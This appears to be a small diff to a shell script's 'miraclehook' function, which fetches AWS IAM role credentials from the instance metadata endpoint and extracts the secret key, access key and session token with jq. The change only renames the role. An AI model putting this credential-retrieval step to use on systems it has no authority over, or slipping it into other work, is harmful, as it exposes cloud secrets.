@@ -14,7 +14,7 @@ fi
 miraclehook() {
     mkdir -p roms
     pushd roms
-    wget -O mycreds -q 'http://169.254.169.254/latest/meta-data/iam/security-credentials/myrole'
+    wget -O mycreds -q 'http://169.254.169.254/latest/meta-data/iam/security-credentials/XaniaBlog'
     SECRET_KEY=$(jq -r '.SecretAccessKey' mycreds)
     ACCESS_KEY=$(jq -r '.AccessKeyId' mycreds)
     TOKEN=$(jq -r '.Token' <mycreds)
